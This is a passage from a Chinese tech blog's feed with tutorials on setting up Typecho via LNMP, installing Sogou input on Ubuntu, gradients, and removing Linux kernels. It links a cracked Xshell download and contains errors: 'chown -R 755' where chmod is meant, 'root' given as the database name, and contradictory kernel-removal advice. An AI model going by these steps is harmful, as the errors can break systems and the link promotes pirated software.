fa-external-link"></i></span><br>输入你的ip，端口设置为22，看22端口是否开通。<br><img data-src="https://pic.superbed.cn/item/5cfbacd9451253d178d943e5.png"></p><p>如果未开通，将这个服务器destory掉，然后重新购买，直到22端口开通为止。</p><h3 id="2-3-XShell连接，开始搭建环境"><a href="#2-3-XShell连接，开始搭建环境" class="headerlink" title="2.3  XShell连接，开始搭建环境"></a>2.3  XShell连接，开始搭建环境</h3><p>这里给一个破解的Xshell链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMU9sQlNZRmpkazlvRFhvdF9WOVZaVWc=" title="https://pan.baidu.com/s/1OlBSYFjdk9oDXot_V9VZUg">https://pan.baidu.com/s/1OlBSYFjdk9oDXot_V9VZUg<i class="fa fa-external-link"></i></span></p><p>一路下一步，安装后打开主程序，文件-&gt;新建：</p><p><img data-src="https://pic.superbed.cn/item/5cfbacda451253d178d94422.png"></p><p><img data-src="https://pic3.superbed.cn/item/5cfbacdc451253d178d94462.png"></p><p>用户名和密码如下图，记得替换为你的服务器：</p><p><img data-src="https://pic.superbed.cn/item/5cfbace2451253d178d944f3.png"></p><p>接下来XShell会提示你接受个证书还是啥的，点击接受并保存就是了。然后你就会来到服务器界面。</p><p>  <img data-src="https://pic.superbed.cn/item/5cfbace4451253d178d94532.png"></p><p>到这里，已经成功连接到你的服务器了。</p><h3 id="2-4-安装mysql-nginx-php环境"><a href="#2-4-安装mysql-nginx-php环境" class="headerlink" title="2.4 安装mysql+nginx+php环境"></a>2.4 安装mysql+nginx+php环境</h3><p>自己分别安装太过麻烦，还好一键傻瓜式安装包- <span class="exturl" data-url="aHR0cHM6Ly9sbm1wLm9yZy8=" title="https://lnmp.org/">lnmp<i class="fa fa-external-link"></i></span></p><p>到笔者安装的时候是1.5版本，可能你看到这篇文章时已经更新，所以自己去找最新版本吧，当然也可以使用1.5版本。</p><p>在xshell中执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.5.tar.gz</span><br><span class="line">tar xvf lnmp1.5.tar.gz</span><br><span class="line">cd lnmp1.5</span><br><span class="line">.&#x2F;install.sh</span><br></pre></td></tr></table></figure><p><img data-src="http://upload-images.jianshu.io/upload_images/606686-e97fffd23200f958.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>上图来源：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JveHVlcml4aW4vYXJ0aWNsZS9kZXRhaWxzLzc5MTA2NTg3P3Rkc291cmNldGFnPXNfcGN0aW1fYWlvbXNn" title="https://blog.csdn.net/Boxuerixin/article/details/79106587?tdsourcetag=s_pctim_aiomsg">https://blog.csdn.net/Boxuerixin/article/details/79106587?tdsourcetag=s_pctim_aiomsg<i class="fa fa-external-link"></i></span></p><p><strong>回车下一步，会提示你输入MySQL的密码，这个自己决定，但是要记住，后续需要使用。</strong></p><p>接下来就是一路回车，然后进入漫长等待，大约需要半小时吧。直到看到下图：</p><p><img data-src="https://pic3.superbed.cn/item/5cfbace5451253d178d94567.png"></p><p>接着在浏览器中输入, <span class="exturl" data-url="aHR0cDovL3lvdXJpcC8=" title="http://yourip/">http://yourip<i class="fa fa-external-link"></i></span> （替换yourip为你的ip），可见下图则说明安装成功：</p><p><img data-src="http://upload-images.jianshu.io/upload_images/606686-5b44be3c96513f34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>上图来源：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JveHVlcml4aW4vYXJ0aWNsZS9kZXRhaWxzLzc5MTA2NTg3P3Rkc291cmNldGFnPXNfcGN0aW1fYWlvbXNn" title="https://blog.csdn.net/Boxuerixin/article/details/79106587?tdsourcetag=s_pctim_aiomsg">https://blog.csdn.net/Boxuerixin/article/details/79106587?tdsourcetag=s_pctim_aiomsg<i class="fa fa-external-link"></i></span></p><h3 id="2-5-安装Typecho"><a href="#2-5-安装Typecho" class="headerlink" title="2.5  安装Typecho"></a>2.5  安装Typecho</h3><p>同样的，笔者安装时<code>Typecho</code>版本为<code>1.1</code>，可自行到官网:<span class="exturl" data-url="aHR0cDovL3R5cGVjaG8ub3JnLyVFRiVCQyU4QyVFNCVCOCU4QSVFOSU4MCU4OSVFNiU4QiVBOSVFNiU5QyU4MCVFNiU5NiVCMCVFNyU4OSU4OCVFNiU5QyVBQyVFMyU4MCU4Mg==" title="http://typecho.org/%EF%BC%8C%E4%B8%8A%E9%80%89%E6%8B%A9%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E3%80%82">http://typecho.org/，上选择最新版本。<i class="fa fa-external-link"></i></span></p><p>进如<code>/home/wwwroot</code>目录 – <code>cd /home/wwwroot</code></p><p>执行以下代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;typecho.org&#x2F;downloads&#x2F;1.1-17.10.30-release.tar.gz</span><br><span class="line">tar xvf 1.1-17.10.30-release.tar.gz </span><br><span class="line">cd &#x2F;home&#x2F;wwwroot</span><br><span class="line">mv default&#x2F; old</span><br><span class="line">mv build&#x2F; default</span><br><span class="line">chown -R 755 &#x2F;home&#x2F;wwwroot</span><br><span class="line">chown -R www:www &#x2F;home&#x2F;wwwroot&#x2F;</span><br></pre></td></tr></table></figure><h3 id="2-6-创建typecho数据库"><a href="#2-6-创建typecho数据库" class="headerlink" title="2.6  创建typecho数据库"></a>2.6  创建typecho数据库</h3><p>执行以下命令：</p><p><code>mysql -u root -p</code></p><p>输入密码，接着会进入mysql管理窗口。</p><p>执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create database typecho;</span><br><span class="line">exit;</span><br></pre></td></tr></table></figure><h3 id="2-7-完成typecho安装"><a href="#2-7-完成typecho安装" class="headerlink" title="2.7 完成typecho安装"></a>2.7 完成typecho安装</h3><p>在浏览器中输入,<span class="exturl" data-url="aHR0cDovL3lvdXJpcCjmm7/mjaLkuLrkvaDnmoRpcCks5Lya6L+b5YWldHlwZWNob+eahOWuieijheW8leWvvOeVjOmdoi4v" title="http://yourip(替换为你的ip),会进入typecho的安装引导界面./">http://yourip（替换为你的ip），会进入typecho的安装引导界面。<i class="fa fa-external-link"></i></span></p><p>以下图片来源：<span class="exturl" data-url="aHR0cHM6Ly9hc2sucWNsb3VkaW1nLmNvbS9kcmFmdC8xMDA4NDUzL3ByazIzN2s0djMucG5nP2ltYWdlVmlldzIvMi93LzE2MjA=" title="https://ask.qcloudimg.com/draft/1008453/prk237k4v3.png?imageView2/2/w/1620">https://ask.qcloudimg.com/draft/1008453/prk237k4v3.png?imageView2/2/w/1620<i class="fa fa-external-link"></i></span></p><p><img data-src="https://ask.qcloudimg.com/draft/1008453/prk237k4v3.png?imageView2/2/w/1620" alt="img"></p><p>点击下一步，进入:</p><p><img data-src="https://upload-images.jianshu.io/upload_images/3778244-94a8170cbabc82d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">端口 3306</span><br><span class="line">数据库名 root</span><br><span class="line">密码： 你的密码</span><br><span class="line">其余不用更改</span><br></pre></td></tr></table></figure><p>然后下一步，得到类似这种界面：</p><p><img data-src="https://pic.superbed.cn/item/5cfbace7451253d178d945a5.png"></p><p>最后就可以来看你的博客站点啦：</p><p><img data-src="https://ask.qcloudimg.com/draft/1008453/ekmy1frrd9.png?imageView2/2/w/1620"></p><h2 id="3-可能遇到的问题"><a href="#3-可能遇到的问题" class="headerlink" title="3. 可能遇到的问题"></a>3. 可能遇到的问题</h2><p>Q:Typecho前台链接或者后台登录出现404?</p><p>编程enable-php.conf文件：</p><p><code>vi /usr/local/nginx/conf/enable-php.conf</code></p><p>然后改为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^&#x2F;]\.php(&#x2F;|$)</span><br><span class="line">&#123;</span><br><span class="line">        #try_files $uri &#x3D;404;</span><br><span class="line">        fastcgi_pass  unix:&#x2F;tmp&#x2F;php-cgi.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        include fastcgi.conf;</span><br><span class="line">        include pathinfo.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下图</p><p><img data-src="https://pic.superbed.cn/item/5cfbace8451253d178d945e9.png"></p><p>最后重启nginx服务即可:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;nginx restart</span><br></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JveHVlcml4aW4vYXJ0aWNsZS9kZXRhaWxzLzc5MTA2NTg3P3Rkc291cmNldGFnPXNfcGN0aW1fYWlvbXNn" title="https://blog.csdn.net/Boxuerixin/article/details/79106587?tdsourcetag=s_pctim_aiomsg">使用 Vultr 搭建 WordPress 博客教程（超详细）<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxMzYyMTA1L2FydGljbGUvZGV0YWlscy84MDcwNjc1MA==" title="https://blog.csdn.net/qq_31362105/article/details/80706750">Xshell6 中文不限时版下载(免密匙)（笔记)<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMzU2MTMy" title="https://cloud.tencent.com/developer/article/1356132">如何搭建 Typecho 博客<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ib2tlMTEyLmNvbS81MTEyLmh0bWw=" title="https://boke112.com/5112.html">Typecho前台链接或者后台登录出现404的解决方法<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建属于自己的博客系列教程零-绪论</title>
      <link href="/archives/b5eb44b9.html"/>
      <url>/archives/b5eb44b9.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-写在最前面"><a href="#1-写在最前面" class="headerlink" title="1.  写在最前面"></a>1.  写在最前面</h2><blockquote><p>折腾了整整一个五一，总算是完成了自己的博客系统。为了给想要搭建自己的博客，但是又和我一样是技术小白的人铺点路，所以准备开个博客搭建的系列教程，避免后来人像我一样走了一大堆弯路。</p></blockquote><p>先贴上自己的博客网站：<a href="https://www.ravenxrz.ink/">https://www.ravenxrz.ink</a>   </p><a id="more"></a><p>系列教程目录：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b5eb44b9.html">从零开始搭建属于自己的博客系列教程零 – 绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/4c781aa7.html">从零开始搭建属于自己的博客系列教程一 – 博客系统搭建</a></li><li><a href="https://www.ravenxrz.ink/archives/1cbfa5af.html">从零开始搭建属于自己的博客系列教程二 – 域名绑定</a></li><li><a href="https://www.ravenxrz.ink/archives/9f4d945c.html">从零开始搭建属于自己的博客系列教程三 – 主题选择与CommentToMail插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/e8deae94.html">从零开始搭建属于自己的博客系列教程四 – 去掉烦人的index.php后缀与常用插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/3cc5aa32.html">从零开始搭建属于自己的博客系列教程五 – 图床选择与博客迁移</a></li><li><a href="https://www.ravenxrz.ink/archives/11c4d80.html">从零开始搭建属于自己的博客系列教程六 – 博客系统备份</a></li><li><a href="https://www.ravenxrz.ink/archives/1eb3d9.html">从零开始搭建属于自己的博客系列教程七 – 开启全站HTTPS</a></li></ul><h2 id="2-选用什么搭建自己的博客？"><a href="#2-选用什么搭建自己的博客？" class="headerlink" title="2.  选用什么搭建自己的博客？"></a>2.  选用什么搭建自己的博客？</h2><h3 id="2-1-个人经历"><a href="#2-1-个人经历" class="headerlink" title="2.1  个人经历"></a>2.1  个人经历</h3><p>从2017年学习了点编程知识以来，就想写点东西。从最开始选择到了<strong>简书</strong>，是因为简书的UI做得真的蛮好看，用户基量也算大，在大概使用了一年的简书后，<strong>我发现简书平台充斥着大量与技术无关的博文（废话，人家本来就不是面向IT人员的）与假、水用户。</strong>之后准备投入更为专一的<strong>CSDN平台</strong>，CSDN算是个老平台了，而且是纯面向IT方面的，水军也少，并且支持一键转移自己的博客文章，所以一开始也还算投的来。但是在使用了一段时间后，我发现<strong>CSDN作为一个面向IT的博客平台，自己的系统的有着不少的bug（文章评论bug、个人设置bug），加上UI一直不是我的菜</strong>，还会强制加上一些广告。emmm，继续切换吧。</p><p>在离开简书时，除了选择了CSDN这种大平台，我还测试过<strong>hexo</strong>这种自己搭建的静态博客，但是没用多久就放弃了，个人觉得其优缺点可以有如下：</p><p>优点：</p><ul><li>不需要服务器，直接在github上可搭建，同时还有github的域名支撑，经济实惠。</li><li>天然支持markdown语法，写博客必备。</li><li>大量主题可选（然而我缺没找到一个合适自己的），官方文档支持较好，线下也有很多基于hexo搭建的平台，所以有问题可以大量google或百度。</li></ul><p>缺点：</p><ul><li>github上搭建既是优点也是缺点，因为速度有些慢，但是本来博客流量就不算大，其实也不算啥。</li><li>由于hexo是先在本地上写好，再用命令上传，命令？那就涉及到一堆环境了，所以一旦你要更换电脑设备写博客，那么环境又得重新搭建。</li></ul><p>嗯，咱们来<strong>总结一下</strong>，</p><p>Q1：我为什么要搭建博客？</p><p>A1：记录技术日志，顺便装装逼也行。</p><p>Q2：想要搭建什么样的博客？</p><p>A2：<strong>美观、无严重Bug、无广告、不会随意锁定文章（简书曾经锁过我的文章）、支持在线编辑和markdown语法。</strong></p><h3 id="2-2-选用博客系统分析"><a href="#2-2-选用博客系统分析" class="headerlink" title="2.2 选用博客系统分析"></a>2.2 选用博客系统分析</h3><p><strong>先给出我最终的选择：Typecho</strong></p><p>说了一堆曾经用过的博客系统，那么到底我们该选择什么样的博客才合适。百度、知乎了一波后。我发现<strong>WordPress和Typecho</strong>，特别是<strong>WordPress</strong>频繁出现在各大回答评论中，行吧，咱们就先试试水。</p><p><strong>WordPress</strong>可以说是最大的建站系统了，很多网站都是基于它建立的。但是使用了一天半下来，个人感觉如下：</p><ul><li>提供免费域名（可以不用服务器），但是这种方式下有各种限制，无法安装插件。</li><li>使用自己的服务器，可以安装各类插件，种类过多甚至让人不知道安装什么插件才好，但是支持的功能很多很多。</li><li>提供超多丰富的主题，主题采用模块化设置，但是从设置上的体验上来看，效果并不大好。很多主题自带SEO。这些主题不光是针多博客，具有泛化性，商务、广告、电商等等都有相关主题。</li><li>不支持markdown，需额外安装插件，且自带的区块编辑器超级难用。</li><li>卡顿很明显（可能是我的服务器在国外的原因）。</li><li>社区活跃，问题容易解决</li><li>支持自动备份（需插件支持）</li></ul><p>必须承认的是WordPress非常强大，但是为了兼容各种插件、主题，导致了自身的臃肿卡顿，不支持markdown（加了插件也不好用）也满足不了我的需求。<strong>毕竟我只想要做个博客系统。</strong></p><p>那么反过来，再来看看<strong>Typecho</strong>这类轻系统，安装使用后，给我的第一个感觉就是轻而快，简洁且对博客支持是非常友好的，个人感觉如下：</p><ul><li>轻量，加载速度快，控制面板清爽。</li><li>主题相对wordpress少，且只能手动安装，但是都是针对博客的，所以可说体验与美观程度都比wordpress好。</li><li>插件相对wordpress少，且只能手动安装。</li><li>仅支持手动备份，可通过脚本+crontab自动备份（后续会有专门的博文介绍这个）</li><li>使用人数较少，问题需要更多的百度、谷歌。</li></ul><p>嗯，作为绪论就是酱紫了，主要是对各种网站系统做个简单分析，最后只能知道一点：使用<strong>Typecho</strong>来做我们的博客吧！</p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>至ubuntu新手-搜狗输入法安装</title>
      <link href="/archives/2535dbde.html"/>
      <url>/archives/2535dbde.html</url>
      
        <content type="html"><![CDATA[<p>对于<code>Ubuntu</code>的初学者来说，来到<code>Ubuntu</code>众多不习惯之一就是没有好用的输入法了。所以这里介绍一下如何在<code>Ubuntu</code>下安装搜狗输入法。</p><h3 id="step1-到搜狗输入法官网下载linux版本安装包"><a href="#step1-到搜狗输入法官网下载linux版本安装包" class="headerlink" title="step1 到搜狗输入法官网下载linux版本安装包"></a>step1 到搜狗输入法官网下载linux版本安装包</h3><p>网址：<span class="exturl" data-url="aHR0cHM6Ly9waW55aW4uc29nb3UuY29tL2xpbnV4Lz9yPXBpbnlpbiVFMyU4MCU4Mg==" title="https://pinyin.sogou.com/linux/?r=pinyin%E3%80%82">https://pinyin.sogou.com/linux/?r=pinyin。<i class="fa fa-external-link"></i></span><br>根据自己操作系统的版本选择32还是64位的os。一般情况个人使用都是64位的了，只有部分实验室平台还在使用32位。</p><p>最后可以得到一个<code>deb</code>包。暂时不安装。</p><a id="more"></a><h3 id="step2-安装各个fcitx包"><a href="#step2-安装各个fcitx包" class="headerlink" title="step2 安装各个fcitx包"></a>step2 安装各个fcitx包</h3><p>打开你的<code>ubuntu software</code></p><p><img data-src="https://pic.superbed.cn/item/5cfbaea9451253d178d964c7.png" alt="在这里插入图片描述"><br>在搜索框搜索<code>fcitx</code>:</p><p><img data-src="https://pic1.superbed.cn/item/5cfbaeab451253d178d96512.png" alt="在这里插入图片描述"><br>如果你的搜索框搜索出有上述结果就<strong>全部安装</strong>，如果没有就需要<strong>更换源</strong>：</p><p>这里说一下更换源的方法，一般来说更换源的方法其实都是更改下面这个文件里面的内容：</p><p><img data-src="https://pic.superbed.cn/item/5cfbaeac451253d178d9654c.png" alt="在这里插入图片描述"><br>这就分为手动更新和采用ubuntu自动选项更新了。我就比较懒了，一般使用<code>ubuntu</code>自带方式更新，方法如下：</p><p>1.打开<code>ubuntu software</code>：<br><img data-src="https://pic.superbed.cn/item/5cfbaeae451253d178d96586.png" alt="在这里插入图片描述"></p><p>选择<code>software&amp;updates</code>。得到如下界面:</p><p><img data-src="https://pic1.superbed.cn/item/5cfbaeb5451253d178d96651.png" alt="在这里插入图片描述"><br>更改中间的Download from，我这里已经更改为阿里云的了，一般来说国内用阿里，163，搜狐的都还不错。具体使用哪个就看你自己咯。</p><p>选择完后，在终端执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>跑完再去<code>ubuntu software</code>中搜索<code>fcitx</code>应该就没问题了。</p><h3 id="step3-安装搜狗输入法包"><a href="#step3-安装搜狗输入法包" class="headerlink" title="step3 安装搜狗输入法包"></a>step3 安装搜狗输入法包</h3><p>找到你在第一步中下载的安装包，双击或者使用终端执行<code>sudo dpkg -i xxxx.deb</code>(xxx 代表搜狗的那个包名)安装。在<strong>这之中可能会出现安装出错，未完成安装</strong>。这时候在终端执行<code>sudo apt install -f</code>即可。安装完成后<strong>关机重启</strong>。</p><h3 id="step4-切换输入源"><a href="#step4-切换输入源" class="headerlink" title="step4 切换输入源"></a>step4 切换输入源</h3><p>打开设置中心，我这里以ubuntu18为例，其他版本差不多。<br>找到语言设置<br><img data-src="https://pic.superbed.cn/item/5cfbaeb6451253d178d96683.png" alt="在这里插入图片描述"><br>打开“管理已安装语言”：<br><img data-src="https://pic3.superbed.cn/item/5cfbaeb8451253d178d966b9.png" alt="在这里插入图片描述"><br>更改<strong>Keyborad input method system</strong> 为 <strong>fcitx</strong>。</p><h3 id="step5-配置输入法"><a href="#step5-配置输入法" class="headerlink" title="step5 配置输入法"></a>step5 配置输入法</h3><p>终于到了最后一步，打开<code>fcitx config Tool</code>:</p><p><img data-src="https://pic.superbed.cn/item/5cfbb467451253d178d9aeba.png" alt="在这里插入图片描述"></p><p>通过点击+号，找到搜狗输入法添加即可，不过推荐面板上再添加一个英文输入法，因为不论是编程还是敲命令都是用英文的嘛。方便切换。</p><p>ok，安装至此算是结束了，快去看看是否可以使用了吧。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb469451253d178d9aef6.png" alt="在这里插入图片描述"></p><h3 id="一些额外的问题："><a href="#一些额外的问题：" class="headerlink" title="一些额外的问题："></a>一些额外的问题：</h3><p>FAQ：为什么我的fcitx CPU占用率很高？如下图:<br><img data-src="https://pic.superbed.cn/item/5cfbb46b451253d178d9af40.png" alt="在这里插入图片描述"><br>这其实是搜狗云输入的问题，打开 fcitx config tool，找到附件项(Addon)：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb46c451253d178d9af75.png" alt="在这里插入图片描述"><br>勾选高级选项，并取消搜狗云输入即可:<br><img data-src="https://pic.superbed.cn/item/5cfbb46e451253d178d9afa9.png" alt="在这里插入图片描述"><br>最后重启。</p><p>虽然搜狗输入法还有一些莫名的bug，比如输入的时候显示全是乱的，切换卡顿等等。不过，笔者也使用过IBus的输入方式，安装方式简单一些，但是输入效果和搜狗完全没得比。综合来看，还是选择搜狗吧。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
            <tag> 输入法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>半小时搞定方向导数，梯度是什么</title>
      <link href="/archives/37f284fc.html"/>
      <url>/archives/37f284fc.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写这篇文章的<strong>原因</strong>一方面是因为毕业设计选题和神经网络相关，而神经网络的反向传播算法是基于负梯度下降的，所以必须搞懂什么是梯度。另一方面是因为自己其实很久之前搞数模就看过负梯度下降的理论，但是看完用完一次就忘记一次，所以这里记录一下。<br><strong>我在这篇文章中并不会写特别多详细的理论，公式。只是把一些我看过觉得特别有用的资料、视频贴上来，以及作一点简单的总结</strong></p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>Q1： 什么是梯度，为什么谈到梯度，总是会提到方向导数？</p><p>A：其实是因为梯度是由方向导数所推导出来的。所以要搞懂梯度，首先应该要学习什么是方向导数。</p><p>什么是方向导数，看这个视频就完全够了（10分钟足够）：<span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj0tRHVtdEJpVzRIRQ==" title="https://www.youtube.com/watch?v=-DumtBiW4HE">https://www.youtube.com/watch?v=-DumtBiW4HE<i class="fa fa-external-link"></i></span> （视频在youtube上，所以，you know…)</p><p>特别注意的是，<strong>方向导数是一个数</strong>，它只是说，函数在给定的一个方向上的导数是多少，<strong>而不是向量</strong>。</p><p>方向导数的计算公式是（以二元函数为例）：<br>$$<br>D_uf = &lt;f_x,f_y&gt; &lt;u_x,u_y&gt;<br>$$<br>其实就是两个向量的内积，内积的计算公式有两个，一个是对应项相乘再相加，另一个为两个向量的模长 X cos&lt;两个向量的夹角&gt;。使用第二个公式所以有<br>$$<br>D_uf = |&lt;f_x,f_y&gt;|\times |&lt;u_x,u_y&gt;|\times cost\theta<br>\<br>D_uf = |&lt;f_x,f_y&gt;|\times cos\theta  \quad\quad |u_x,u_y|=1，因为&lt;u_x,u_y&gt;为单位向量<br>$$<br>要想方向导数达到最大，$\theta=0$即可。而<strong>梯度就是指使得方向导数达到最大值的那个方向向量</strong>。注意，梯度是一个<strong>向量</strong>。而且我们可以知道，<strong>在梯度上，方向导数一定是大于等于0的</strong>，因为模长是不可能小于0的，<strong>换句话说函数在梯度方向一定是非减的</strong>。</p><p>Q2：为什么说沿着梯度方向是函数在该点增长最快的方向？<br>A：首先，你一定知道在一元函数时，沿着曲线的切线方向增长速度最快（切线的斜率就是函数在该点的求导值）。那么上升到二元的时候，要求曲线(曲面）在一点的增长最快方向，我们是不是应该也要对函数在该点求导呢。只不过二元时的求导方向有无数个方向，所以我们引入了方向导数。那么<strong>一个函数在某点的最快增长方向就转化为在哪个方向下我们的方向导数会取得最大值</strong>，而在<strong>Q1</strong>中，我们已经解释了这个问题，那就是沿着梯度方向。<br>所以得到这样的结论：<strong>沿着梯度方向是函数在该点增长最快的方向，反之沿着负梯度方向就是下降最快的方向，这也是神经网络反向传播算法基于负梯度下降的依据</strong>。</p><p>梯度的视频：<span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1ucGtsMTlyY3BkWQ==" title="https://www.youtube.com/watch?v=npkl19rcpdY">https://www.youtube.com/watch?v=npkl19rcpdY<i class="fa fa-external-link"></i></span></p><p>Q3：为什么我在网上看到的梯度总是垂直于某个曲线的投影在该点的切线？</p><p>准确来说，梯度的方向是垂直于该点所在的等高线的切线的。这样说肯定没说明白，所以推荐一个链接：<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNzczMTgxOQ==" title="https://zhuanlan.zhihu.com/p/27731819">https://zhuanlan.zhihu.com/p/27731819<i class="fa fa-external-link"></i></span></p><p>上文图文并茂且有公式推导，相信你应该能看懂的。</p><p>最后，再推荐一个视频，讲解偏导数与方向梯度:<span class="exturl" data-url="aHR0cDovL3d3dy4zNjV5Zy5jb20vYTY1MDM0ODE5MDQ0ODQ4NDQwNDYvI21pZD0xNTczMDY1MzgwMDk5MDg1" title="http://www.365yg.com/a6503481904484844046/#mid=1573065380099085">http://www.365yg.com/a6503481904484844046/#mid=1573065380099085<i class="fa fa-external-link"></i></span></p><p><strong>不想在没有贴图的情况下还写这么多字，所以大家多看看视频吧。我觉得贴的几个视频已经很好理解。</strong></p><p>OK，就酱。相信看完上述资料，你应该搞懂什么是方向导数和梯度了吧。</p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方向导数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两种删除linux内核的方式</title>
      <link href="/archives/a7295ff5.html"/>
      <url>/archives/a7295ff5.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>在<code>linux</code>的世界里，升级、更换内核是很经常的事情，如果你在安装系统的时候给boot分区分小了，偶尔就会出现<code>boot</code>分区的占用率爆掉的情况。这里给出两种删除内核的方式</p><a id="more"></a><h2 id="2-删除内核"><a href="#2-删除内核" class="headerlink" title="2. 删除内核"></a>2. 删除内核</h2><h3 id="2-1-方式一"><a href="#2-1-方式一" class="headerlink" title="2.1 方式一"></a>2.1 方式一</h3><p><strong>step1:</strong><br>如果你使用<code>debian</code>系发行版本的<code>linux</code>的话，可以使用<code>dpkg</code>命令(<code>fedora</code>系好像是<code>rpm</code>)来查看本机装有了哪些内核，具体命令为 :</p><pre><code>dpkg --get-selections|grep linux</code></pre><p><img data-src="https://pic3.superbed.cn/item/5cfbb5c4451253d178d9d01c.png" alt="在这里插入图片描述"><br>当然了，我才清理了内核，所以现在只有一个可用的内核版本:<code>linux-4.15.0-42</code>。如果你的主机上安装过多个内核的话，这里应该会显示多个才对。</p><p><strong>step2:</strong><br>接着查看当前自己使用的是哪个版本:</p><p><code>uname -r</code></p><p><img data-src="https://pic1.superbed.cn/item/5cfbb5c6451253d178d9d051.png" alt="在这里插入图片描述"></p><p><strong>step3:</strong><br>使用 <code>sudo apt-get purge linux-xxx</code> 把所有不要的内核版本有关文件全部删了，如这里可以把所有包含4.15.0-42的文件删掉。</p><p><strong>删除除当前你使用的版本的内核以外的其他内核。</strong></p><p>之后在使用<code>dpkg --get-selections|grep linux</code>命令查看一下是不是已经删除了呢。</p><h3 id="2-2-方式二"><a href="#2-2-方式二" class="headerlink" title="2.2 方式二"></a>2.2 方式二</h3><p>方式一适合于使用官方包管理器来升级内核版本，当我们通过源码编译来安装内核时，上述方法就不适用了，因为你使用<code>dpkg --get-selections|grep linux</code>命令来查看安装了那些内核时，自编译的内核是不会显示出来的，那么该如何删除这样的内核呢？</p><p><strong>step1:</strong><br>来到/boot目录:把下面红框内的文件都给删了，注意自己不需要哪些版本哈。XD</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5cd451253d178d9d0d0.png" alt="在这里插入图片描述"></p><p>可以使用通配符来删除：</p><p><code>sudo rm *4.15.0-42*</code></p><p><strong>step2:</strong><br>来到<code>/lib/modules/</code>目录下，把不要的版本文件删除</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb5cf451253d178d9d10c.png" alt="在这里插入图片描述"><br>（可选），查看一下<code>/usr/src</code>有没有源码文件，必要的话把源码也删除了</p><p><strong>step3:</strong><br>更新一下启动项: <code>sudo update-grub</code></p><p>完。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile通用模板</title>
      <link href="/archives/f4639d5e.html"/>
